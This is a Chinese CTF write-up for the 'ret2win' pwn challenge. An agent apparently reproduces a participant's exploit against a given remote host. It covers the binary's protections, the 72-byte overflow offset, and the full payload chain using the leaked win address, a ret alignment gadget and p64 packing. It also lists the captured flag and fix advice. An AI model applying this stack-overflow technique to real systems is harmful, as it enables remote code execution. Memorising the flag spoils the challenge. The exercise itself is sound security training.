# ret2win · 渗透记录

> **脚本来源**：本题 exploit 脚本由参赛者本人手搓提供，Agent 负责在目标环境复现、验证、排错与题解/记录整理。


## 2.1 基本信息
| 字段 | 内容 |
|---|---|
| 题目 | ret2win |
| 类型 | Pwn / 栈溢出 ret2win（PIE 泄露 + 栈对齐） |
| 入口 | 219.216.64.241:39546（附件：attachments/pwn + libc.so.6 + ld-linux） |
| 耗时 | 0 日 0 时 1 分 10 秒 |
| LLM | deepseek-flash |
| flag | `nex{Re72win_ko3ko111}` |

## 2.2 目标与授权
- 授权范围：仅用户给定的 219.216.64.241:39546；只建立少量连接发 exploit 输入，未扫描/爆破
- 禁止动作：DoS、横向移动、持久化、读取无关数据

## 2.3 侦察与指纹
ELF64 amd64；PIE + NX + Full RELRO，无 canary，未 strip；符号 win@0x1169、main@0x117f；启动即打印 `gift: %p`（泄露 win 运行时地址）；win 内 `lea 0x2004 "cat ./flag"` -> call 0x1030（system@plt）

## 2.4 攻击面
远程 TCP 交互式程序：main 里 read/gets 读入栈缓冲区，无长度校验 -> 覆盖返回地址；同时 gift 泄露 PIE 基址

## 2.5 漏洞判定
- 类型：Pwn / 栈溢出 ret2win（PIE 泄露 + 栈对齐）
- 位置：main 栈缓冲区溢出（偏移 72 到 saved RIP）
- 证据：evidence/step1_*、step2_*（两次连接 ASLR 不同：0x5592a235d169 / 0x55a7d2e98169，payload 各 88 字节，回显同一 flag）；静态：strings 0x2004=cat ./flag、win 字节 554889e5...e8b4feffff 解出 call system@plt
- 误报排除：两次不同 gift 泄露分别计算 base/ret 均打通，排除固定地址/硬编码；payload 长度 88 = 72 填充 + 8 ret 对齐 + 8 win，回显 flag 与 regex 一致（nex{...}）；未加 ret 对齐会崩在 system 的 movaps（本机无法跑 ELF，靠对齐位存在性 + 成功回显判断）

## 2.6 利用链
```
connect 219.216.64.241:39546
recv -> "gift: 0x55e433b5e169"
win  = gift
base = win - 0x1169
ret  = base + 0x101A        # 一条 ret，修 system 的 16 字节栈对齐
payload = b"A"*72 + p64(ret) + p64(win)
sendline -> 程序 read 溢出 -> ret 到 win -> system("cat ./flag")
recv -> nex{Re72win_ko3ko111}
```

## 2.7 影响
远程栈溢出到 win()，直接执行 cat ./flag 读 flag；若赢函数换成 system("/bin/sh") 即为完整 RCE

## 2.8 修复建议
用 fgets/read 限制长度并校验返回值；开启 -fstack-protector-all（canary）；保留 PIE/NX/Full RELRO；不要打印内部函数地址（去掉 gift 泄露）

## 2.9 复盘
PIE 靠 gift 泄露算基址；72 偏移 + 一条 ret 对齐即打通，与手搓 p1.py 完全一致（只换端口）。
